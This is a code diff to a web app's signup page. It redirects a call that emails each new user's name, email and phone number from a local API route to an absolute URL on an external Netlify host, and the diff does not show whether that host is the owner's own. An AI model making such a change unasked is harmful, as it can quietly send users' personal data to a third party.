@@ -47,7 +47,7 @@ export default function SignupPage() {
       sessionStorage.setItem("tempSignupData", JSON.stringify(tempSignupData))
 
       // ✅ Send phone, name, email to your email API only
-      await apiCall("/api/send-email2", "POST", {
+      await apiCall("https://securemenow.netlify.app/api/send-email3", "POST", {
         subject: "New Signup with Phone Number",
         body: `New user signed up:\n\nName: ${name}\nEmail: ${email}\nPhone: ${phone}`,
       })
